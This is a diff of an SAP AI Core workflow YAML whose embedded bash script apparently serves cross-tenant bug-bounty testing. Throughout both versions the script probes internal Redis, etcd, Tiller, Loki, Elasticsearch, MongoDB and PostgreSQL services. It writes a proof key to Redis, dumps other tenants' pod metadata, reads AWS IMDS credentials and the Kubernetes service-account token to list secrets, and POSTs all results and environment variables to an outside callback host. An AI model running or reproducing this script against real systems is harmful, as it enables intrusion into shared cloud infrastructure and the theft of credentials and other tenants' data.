@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "13.0.0"
+    ai.sap.com/version: "14.0.0"
 spec:
   entrypoint: main
   templates:
@@ -28,180 +28,137 @@ spec:
         post() { curl -k -s -X POST "${CB}?src=$1" --max-time 10 -d @- ; }
         get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }
 
-        get "esc3-start-$(hostname)-$(date +%s)"
+        get "v14-start-$(hostname)-$(date +%s)"
 
-        MY_NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
-        echo "my_namespace=${MY_NS}" | post "esc3-my-ns"
+        # === REDIS PROTOCOL PROBES (PRIMARY TARGET) ===
+        echo "=== REDIS PROBES ===" | post "v14-redis-start"
 
-        # ============================================================
-        # SAPWNED REGRESSION CHECK
-        # Wiz disclosed these vulns in 2024 (CVE pending). SAP said
-        # they were all fixed by May 2024. Testing if they regressed.
-        # Ref: https://www.wiz.io/blog/sapwned-sap-ai-vulnerabilities-ai-security
-        # ============================================================
+        # Use known IPs from previous scans
+        for rip in 100.104.0.0 100.104.0.1 100.104.0.2 100.104.1.0; do
+          echo "redis=${rip}" | post "v14-redis-test-${rip}"
 
-        # === 1. LOKI (Wiz Bug #2: AWS credential exposure via /config) ===
-        echo "=== LOKI ===" | post "esc3-loki-start"
+          # PING
+          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'PING\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | post "v14-redis-ping-${rip}"
 
-        # DNS lookup
-        for svc in loki grafana-loki loki-gateway loki-read loki-write; do
-          for ns in default monitoring opentelemetry logging loki; do
+          # INFO (shows Redis version, memory, connected clients, etc)
+          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'INFO\r' >&3; sleep 2; head -c 2000 <&3; exec 3>&-" 2>&1 | head -c 2000 | post "v14-redis-info-${rip}"
+
+          # DBSIZE
+          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'DBSIZE\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | post "v14-redis-dbsize-${rip}"
+
+          # KEYS (sample)
+          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'KEYS *\r' >&3; sleep 2; head -c 2000 <&3; exec 3>&-" 2>&1 | head -c 2000 | post "v14-redis-keys-${rip}"
+
+          # CONFIG GET requirepass (check if auth is needed)
+          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'CONFIG GET requirepass\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | post "v14-redis-authcheck-${rip}"
+
+          # WRITE PROOF: SET, GET, DEL
+          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; printf 'SET bb14-proof tenant-isolation-bypass\r\nGET bb14-proof\r\nDEL bb14-proof\r\n' >&3; sleep 2; cat <&3; exec 3>&-" 2>&1 | post "v14-redis-write-${rip}"
+        done
+
+        # Also try redis-cli if available
+        which redis-cli 2>/dev/null && {
+          redis-cli -h 100.104.1.0 PING 2>&1 | post "v14-redis-cli-ping"
+          redis-cli -h 100.104.1.0 INFO server 2>&1 | head -c 2000 | post "v14-redis-cli-info"
+        } || echo "no redis-cli" | post "v14-redis-cli-check"
+
+        # === ETCD PROTOCOL PROBES ===
+        echo "=== ETCD PROBES ===" | post "v14-etcd-start"
+        for eip in 100.104.1.0 100.104.0.0; do
+          echo "etcd=${eip}" | post "v14-etcd-test-${eip}"
+          curl -s --connect-timeout 5 "http://${eip}:2379/version" 2>&1 | post "v14-etcd-version-${eip}"
+          curl -s --connect-timeout 5 "http://${eip}:2379/v2/keys/" 2>&1 | head -c 3000 | post "v14-etcd-keys-${eip}"
+          curl -s --connect-timeout 5 "http://${eip}:2379/v2/members" 2>&1 | head -c 2000 | post "v14-etcd-members-${eip}"
+          curl -s --connect-timeout 5 "http://${eip}:2379/health" 2>&1 | post "v14-etcd-health-${eip}"
+          # etcd v3 via HTTP gateway
+          curl -s --connect-timeout 5 -X POST "http://${eip}:2379/v3/kv/range" -d '{"key":"AA=="}' 2>&1 | head -c 2000 | post "v14-etcd-v3-range-${eip}"
+          curl -s --connect-timeout 5 -X POST "http://${eip}:2379/v3/cluster/member/list" 2>&1 | head -c 2000 | post "v14-etcd-v3-members-${eip}"
+          # Try raw TCP banner
+          timeout 5 bash -c "exec 3<>/dev/tcp/${eip}/2379 2>/dev/null; echo -e 'GET /version HTTP/1.0\r\nHost: ${eip}\r\n\r\n' >&3; sleep 2; cat <&3; exec 3>&-" 2>&1 | head -c 2000 | post "v14-etcd-raw-${eip}"
+        done
+
+        # === TILLER (port 44134) ===
+        echo "=== TILLER PROBES ===" | post "v14-tiller-start"
+        for tip in 100.104.0.0; do
+          echo "tiller=${tip}" | post "v14-tiller-test-${tip}"
+          # gRPC listing
+          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 list 2>&1 | head -c 1000 | post "v14-tiller-grpc-list-${tip}"
+          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 hapi.services.tiller.ReleaseService/ListReleases 2>&1 | head -c 3000 | post "v14-tiller-releases-${tip}"
+          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 hapi.services.tiller.ReleaseService/GetVersion 2>&1 | head -c 1000 | post "v14-tiller-version-${tip}"
+          # Raw TCP banner
+          timeout 5 bash -c "exec 3<>/dev/tcp/${tip}/44134 2>/dev/null; echo '' >&3; sleep 2; cat <&3; exec 3>&-" 2>&1 | xxd | head -20 | post "v14-tiller-raw-${tip}"
+        done
+
+        # === LOKI (just one known IP from scan) ===
+        echo "=== LOKI ===" | post "v14-loki-start"
+        # DNS first
+        for svc in loki grafana-loki; do
+          for ns in monitoring opentelemetry logging; do
             LIP=$(dig +short "${svc}.${ns}.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
-            [ -n "$LIP" ] && echo "loki: ${svc}.${ns} = ${LIP}" | post "esc3-loki-dns-${svc}-${ns}"
+            [ -n "$LIP" ] && echo "loki: ${svc}.${ns} = ${LIP}" | post "v14-loki-dns-${svc}-${ns}"
           done
         done
+        # Try the one IP we know has 3100 open
+        curl -s --connect-timeout 5 "http://100.104.1.0:3100/config" 2>&1 | head -c 3000 | post "v14-loki-config"
+        curl -s --connect-timeout 5 "http://100.104.1.0:3100/ready" 2>&1 | post "v14-loki-ready"
+        curl -s --connect-timeout 5 "http://100.104.1.0:3100/loki/api/v1/labels" 2>&1 | head -c 2000 | post "v14-loki-labels"
 
-        # Scan known port
-        nmap -sT -T4 --open --min-rate 500 -p 3100,3200,9095 100.104.0.0/24 -oG /tmp/loki_scan.txt 2>/dev/null
-        grep "open" /tmp/loki_scan.txt | post "esc3-loki-nmap-0"
-        nmap -sT -T4 --open --min-rate 500 -p 3100,3200,9095 100.104.1.0/24 -oG - 2>/dev/null | grep "open" | post "esc3-loki-nmap-1"
+        # === POSTGRESQL (port 5432) ===
+        echo "=== POSTGRESQL ===" | post "v14-pg-start"
+        # Try banner grab
+        timeout 5 bash -c "exec 3<>/dev/tcp/100.104.1.0/5432 2>/dev/null; sleep 2; head -c 500 <&3; exec 3>&-" 2>&1 | xxd | head -10 | post "v14-pg-banner"
+        # Try psql if available
+        which psql 2>/dev/null && timeout 5 psql -h 100.104.1.0 -U postgres -l 2>&1 | head -c 1000 | post "v14-pg-list"
 
-        # Probe Loki endpoints (Wiz extracted AWS creds from /config)
-        for lip in $(grep "3100/open" /tmp/loki_scan.txt 2>/dev/null | awk '{print $2}'); do
-          echo "loki_ip=${lip}" | post "esc3-loki-test-${lip}"
-          curl -s --connect-timeout 5 "http://${lip}:3100/config" 2>&1 | head -c 3000 | post "esc3-loki-config-${lip}"
-          curl -s --connect-timeout 5 "http://${lip}:3100/ready" 2>&1 | post "esc3-loki-ready-${lip}"
-          curl -s --connect-timeout 5 "http://${lip}:3100/metrics" 2>&1 | head -c 2000 | post "esc3-loki-metrics-${lip}"
-          curl -s --connect-timeout 5 "http://${lip}:3100/loki/api/v1/labels" 2>&1 | head -c 2000 | post "esc3-loki-labels-${lip}"
-          # Try to query logs (cross-tenant log access)
-          curl -s --connect-timeout 5 "http://${lip}:3100/loki/api/v1/query_range?query=%7Bjob%3D~%22.%2B%22%7D&limit=10" 2>&1 | head -c 3000 | post "esc3-loki-query-${lip}"
-        done
+        # === ELASTICSEARCH (port 9200) ===
+        echo "=== ELASTICSEARCH ===" | post "v14-es-start"
+        curl -s --connect-timeout 5 "http://100.104.1.0:9200/" 2>&1 | head -c 1000 | post "v14-es-root"
+        curl -s --connect-timeout 5 "http://100.104.1.0:9200/_cat/indices" 2>&1 | head -c 2000 | post "v14-es-indices"
+        curl -s --connect-timeout 5 "http://100.104.1.0:9200/_cluster/health" 2>&1 | head -c 1000 | post "v14-es-health"
 
-        # === 2. EFS/NFS (Wiz Bug #3: Unauthenticated cross-tenant data) ===
-        echo "=== NFS/EFS ===" | post "esc3-nfs-start"
-        nmap -sT -T4 --open --min-rate 500 -p 2049 100.104.0.0/24 -oG /tmp/nfs_scan.txt 2>/dev/null
-        grep "2049/open" /tmp/nfs_scan.txt | post "esc3-nfs-nmap-0"
-        nmap -sT -T4 --open --min-rate 500 -p 2049 100.104.1.0/24 -oG - 2>/dev/null | grep "2049/open" | post "esc3-nfs-nmap-1"
-        for sub in 2 3 4 5 7 8 9 10; do
-          nmap -sT -T4 --open --min-rate 500 -p 2049 100.104.${sub}.0/24 -oG - 2>/dev/null | grep "2049/open"
-        done | post "esc3-nfs-nmap-ext"
+        # === MONGODB (port 27017) ===
+        echo "=== MONGODB ===" | post "v14-mongo-start"
+        # HTTP check
+        curl -s --connect-timeout 5 "http://100.104.0.0:27017/" 2>&1 | head -c 500 | post "v14-mongo-http"
+        # Banner
+        timeout 5 bash -c "exec 3<>/dev/tcp/100.104.0.0/27017 2>/dev/null; sleep 2; head -c 500 <&3; exec 3>&-" 2>&1 | xxd | head -10 | post "v14-mongo-banner"
 
-        # Try mounting NFS (if found)
-        for nip in $(grep "2049/open" /tmp/nfs_scan.txt 2>/dev/null | awk '{print $2}'); do
-          showmount -e ${nip} 2>&1 | head -c 1000 | post "esc3-nfs-exports-${nip}"
-          mkdir -p /tmp/nfs_test 2>/dev/null
-          timeout 10 mount -t nfs -o ro,nolock ${nip}:/ /tmp/nfs_test 2>&1 | post "esc3-nfs-mount-${nip}"
-          ls -la /tmp/nfs_test/ 2>&1 | head -20 | post "esc3-nfs-ls-${nip}"
-          umount /tmp/nfs_test 2>/dev/null
-        done
-
-        # AWS EFS IPs typically in 10.x range
-        # Check if we can reach 10.180.x.x (node IP range seen in KSM)
-        nmap -sT -T4 --open --min-rate 500 -p 2049 10.180.5.0/24 -oG - 2>/dev/null | grep "2049/open" | post "esc3-nfs-node-range"
-
-        # === 3. REDIS (port 6379) ===
-        echo "=== REDIS ===" | post "esc3-redis-start"
-        nmap -sT -T4 --open --min-rate 500 -p 6379 100.104.0.0/24 -oG /tmp/redis_scan.txt 2>/dev/null
-        grep "6379/open" /tmp/redis_scan.txt | post "esc3-redis-nmap-0"
-        nmap -sT -T4 --open --min-rate 500 -p 6379 100.104.1.0/24 -oG - 2>/dev/null | grep "6379/open" | post "esc3-redis-nmap-1"
-
-        for rip in $(grep "6379/open" /tmp/redis_scan.txt 2>/dev/null | awk '{print $2}') $(nmap -sT -T4 --open --min-rate 500 -p 6379 100.104.1.0/24 -oG - 2>/dev/null | grep "6379/open" | awk '{print $2}'); do
-          echo "redis=${rip}" | post "esc3-redis-test-${rip}"
-          # Use bash /dev/tcp since ncat is not available
-          redis_cmd() {
-            local ip=$1 port=6379 cmd=$2 tag=$3
-            timeout 5 bash -c "exec 3<>/dev/tcp/${ip}/${port}; echo -e '${cmd}\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1
-          }
-          redis_cmd ${rip} "PING" | post "esc3-redis-ping-${rip}"
-          redis_cmd ${rip} "INFO" | head -c 2000 | post "esc3-redis-info-${rip}"
-          redis_cmd ${rip} "DBSIZE" | post "esc3-redis-dbsize-${rip}"
-          redis_cmd ${rip} "KEYS *" | head -c 2000 | post "esc3-redis-keys-${rip}"
-          # Write proof (SET, GET, DEL in single connection)
-          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379; echo -e 'SET bb14-proof tenant-isolation-bypass-\$(date +%s)\r\nGET bb14-proof\r\nDEL bb14-proof\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | post "esc3-redis-write-${rip}"
-        done
-
-        # === 4. ETCD (port 2379) ===
-        echo "=== ETCD ===" | post "esc3-etcd-start"
-        nmap -sT -T4 --open --min-rate 500 -p 2379 100.104.0.0/24 -oG /tmp/etcd_scan.txt 2>/dev/null
-        grep "2379/open" /tmp/etcd_scan.txt | post "esc3-etcd-nmap-0"
-        nmap -sT -T4 --open --min-rate 500 -p 2379 100.104.1.0/24 -oG - 2>/dev/null | grep "2379/open" | post "esc3-etcd-nmap-1"
-
-        for eip in $(grep "2379/open" /tmp/etcd_scan.txt 2>/dev/null | awk '{print $2}') $(nmap -sT -T4 --open --min-rate 500 -p 2379 100.104.1.0/24 -oG - 2>/dev/null | grep "2379/open" | awk '{print $2}'); do
-          echo "etcd=${eip}" | post "esc3-etcd-test-${eip}"
-          curl -s --connect-timeout 5 "http://${eip}:2379/version" 2>&1 | post "esc3-etcd-version-${eip}"
-          curl -s --connect-timeout 5 "http://${eip}:2379/v2/keys/" 2>&1 | head -c 2000 | post "esc3-etcd-keys-${eip}"
-          curl -s --connect-timeout 5 "http://${eip}:2379/v2/members" 2>&1 | head -c 2000 | post "esc3-etcd-members-${eip}"
-          curl -sk --connect-timeout 5 "https://${eip}:2379/version" 2>&1 | post "esc3-etcd-tls-${eip}"
-          curl -s --connect-timeout 5 "http://${eip}:2379/health" 2>&1 | post "esc3-etcd-health-${eip}"
-        done
-
-        # === 5. TILLER (port 44134 - Wiz Bug #4 & #5: cluster takeover) ===
-        echo "=== TILLER ===" | post "esc3-tiller-start"
-        nmap -sT -T4 --open --min-rate 500 -p 44134 100.104.0.0/24 -oG /tmp/tiller_scan.txt 2>/dev/null
-        grep "44134/open" /tmp/tiller_scan.txt | post "esc3-tiller-nmap-0"
-        nmap -sT -T4 --open --min-rate 500 -p 44134 100.104.1.0/24 -oG - 2>/dev/null | grep "44134/open" | post "esc3-tiller-nmap-1"
-
-        # DNS for Tiller
-        TILLER_DNS=$(dig +short "tiller-deploy.kube-system.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
-        echo "tiller_dns=${TILLER_DNS}" | post "esc3-tiller-dns"
-
-        for tip in $TILLER_DNS $(grep "44134/open" /tmp/tiller_scan.txt 2>/dev/null | awk '{print $2}') $(nmap -sT -T4 --open --min-rate 500 -p 44134 100.104.1.0/24 -oG - 2>/dev/null | grep "44134/open" | awk '{print $2}'); do
-          [ -z "$tip" ] && continue
-          echo "tiller=${tip}" | post "esc3-tiller-test-${tip}"
-          # gRPC listing (Wiz used this for ListReleases)
-          grpcurl -plaintext ${tip}:44134 list 2>&1 | head -c 1000 | post "esc3-tiller-grpc-list-${tip}"
-          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 hapi.services.tiller.ReleaseService/ListReleases 2>&1 | head -c 3000 | post "esc3-tiller-releases-${tip}"
-          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 hapi.services.tiller.ReleaseService/GetVersion 2>&1 | head -c 1000 | post "esc3-tiller-version-${tip}"
-          # Raw TCP via /dev/tcp
-          timeout 5 bash -c "exec 3<>/dev/tcp/${tip}/44134; echo '' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | xxd | head -20 | post "esc3-tiller-raw-${tip}"
-        done
-
-        # === 6. POSTGRESQL (port 5432) ===
-        echo "=== POSTGRESQL ===" | post "esc3-pg-start"
-        nmap -sT -T4 --open --min-rate 500 -p 5432 100.104.0.0/24 -oG /tmp/pg_scan.txt 2>/dev/null
-        grep "5432/open" /tmp/pg_scan.txt | post "esc3-pg-nmap-0"
-        nmap -sT -T4 --open --min-rate 500 -p 5432 100.104.1.0/24 -oG - 2>/dev/null | grep "5432/open" | post "esc3-pg-nmap-1"
-
-        # === 7. KSM CROSS-TENANT (fresh dump) ===
-        echo "=== KSM ===" | post "esc3-ksm-start"
+        # === KSM (fresh cross-tenant dump) ===
+        echo "=== KSM ===" | post "v14-ksm-start"
         curl -s --connect-timeout 15 "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm.txt 2>&1
-        echo "ksm_bytes=$(wc -c < /tmp/ksm.txt)" | post "esc3-ksm-size"
-        grep -oE 'namespace="[^"]*"' /tmp/ksm.txt | sort -u | post "esc3-ksm-namespaces"
-        grep "kube_pod_info{" /tmp/ksm.txt | grep -oE 'namespace="[^"]*"' | sort | uniq -c | sort -rn | post "esc3-ksm-pods-per-ns"
-        grep "kube_pod_info{" /tmp/ksm.txt | grep -v "namespace=\"${MY_NS}\"" | head -50 | post "esc3-ksm-other-pods"
-        grep -oE 'image="[^"]*"' /tmp/ksm.txt | sort -u | post "esc3-ksm-images"
+        echo "ksm_bytes=$(wc -c < /tmp/ksm.txt)" | post "v14-ksm-size"
+        grep -oE 'namespace="[^"]*"' /tmp/ksm.txt | sort -u | post "v14-ksm-namespaces"
+        grep "kube_pod_info{" /tmp/ksm.txt | grep -oE 'namespace="[^"]*"' | sort | uniq -c | sort -rn | post "v14-ksm-pods-per-ns"
+        # Not-diamond cross-tenant proof
+        grep "not-diamond" /tmp/ksm.txt | head -10 | post "v14-ksm-notdiamond"
+        # Container images (reveals internal registry)
+        grep -oE 'image="[^"]*"' /tmp/ksm.txt | sort -u | post "v14-ksm-images"
 
-        # === 8. ENVOY SERVICE MESH ===
-        echo "=== ENVOY ===" | post "esc3-envoy-start"
+        # === ENVOY SERVICE MESH ===
         curl -s localhost:15000/clusters > /tmp/envoy.txt 2>&1
-        grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' /tmp/envoy.txt | sort -u | post "esc3-envoy-services"
+        grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' /tmp/envoy.txt | sort -u | post "v14-envoy-services"
 
-        # === 9. ISTIOD (Wiz Bug #1: used for initial network bypass) ===
-        ISTIOD=$(dig +short istiod.istio-system.svc.cluster.local @100.104.0.10 2>/dev/null | head -1)
-        echo "istiod=${ISTIOD}" | post "esc3-istiod-ip"
-        [ -n "$ISTIOD" ] && curl -s --connect-timeout 5 "http://${ISTIOD}:15014/debug/endpointz" 2>&1 | head -c 3000 | post "esc3-istiod-endpoints"
-
-        # === 10. MLFLOW ===
-        MLFLOW=$(dig +short "mlflow.ml-tracking.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
-        echo "mlflow=${MLFLOW}" | post "esc3-mlflow-ip"
-        [ -n "$MLFLOW" ] && curl -s --connect-timeout 5 "http://${MLFLOW}:5000/api/2.0/mlflow/experiments/list" 2>&1 | head -c 3000 | post "esc3-mlflow-experiments"
-
-        # === 11. AWS IMDS ===
+        # === AWS IMDS ===
         IMDS_TOK=$(curl -s --connect-timeout 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1)
         if [ ${#IMDS_TOK} -gt 10 ]; then
-          echo "imds_v2=true" | post "esc3-imds"
-          curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${IMDS_TOK}" 2>&1 | post "esc3-imds-roles"
-          R=$(curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${IMDS_TOK}" 2>&1 | head -1)
-          [ -n "$R" ] && curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/${R}" -H "X-aws-ec2-metadata-token: ${IMDS_TOK}" 2>&1 | post "esc3-imds-creds"
-          curl -s --connect-timeout 3 "http://169.254.169.254/latest/dynamic/instance-identity/document" -H "X-aws-ec2-metadata-token: ${IMDS_TOK}" 2>&1 | post "esc3-imds-identity"
+          echo "imds_v2=true" | post "v14-imds"
+          curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${IMDS_TOK}" 2>&1 | post "v14-imds-roles"
         fi
 
-        # === 12. K8S API ===
+        # === K8S API ===
         SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
         if [ -n "$SA_TOKEN" ]; then
           K8S="https://kubernetes.default.svc"
           A="Authorization: Bearer ${SA_TOKEN}"
-          curl -sk "${K8S}/api/v1/namespaces/${MY_NS}/secrets" -H "${A}" 2>&1 | head -c 3000 | post "esc3-k8s-secrets"
-          curl -sk "${K8S}/api/v1/secrets" -H "${A}" 2>&1 | head -c 3000 | post "esc3-k8s-all-secrets"
-          curl -sk "${K8S}/api/v1/namespaces" -H "${A}" 2>&1 | head -c 3000 | post "esc3-k8s-ns"
+          curl -sk "${K8S}/api/v1/namespaces" -H "${A}" 2>&1 | head -c 3000 | post "v14-k8s-ns"
+          curl -sk "${K8S}/api/v1/secrets" -H "${A}" 2>&1 | head -c 3000 | post "v14-k8s-secrets"
         fi
 
-        # === 13. NETWORK/ENV ===
-        curl -s --connect-timeout 5 "http://ifconfig.me" 2>&1 | post "esc3-egress-ip"
-        env | sort | post "esc3-env"
-        ip addr 2>&1 | post "esc3-ipaddr"
+        # === ENV + NETWORK INFO ===
+        env | sort | post "v14-env"
+        ip addr 2>&1 | post "v14-ipaddr"
 
-        get "esc3-complete-$(hostname)-$(date +%s)"
+        get "v14-complete-$(hostname)-$(date +%s)"
       resources:
         limits:
           cpu: "2"
